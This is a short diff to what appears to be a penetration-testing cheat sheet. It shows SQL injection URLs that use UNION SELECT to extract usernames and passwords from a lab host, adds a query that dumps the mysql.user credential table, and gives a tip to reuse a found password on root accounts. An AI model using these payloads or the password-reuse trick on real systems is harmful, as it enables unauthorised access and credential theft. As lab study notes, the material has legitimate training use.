@@ -91,6 +91,13 @@ http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,column_name,6 F
 http://192.168.11.35/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users
 ```
 
+#### Enumeration
+
+```bash
+SELECT * FROM mysql.user;
+```
+
 ##### Notes
 
 - If you have a valid password, try using that same password for the admin accounts (root)
+- mycli solved ssl problem
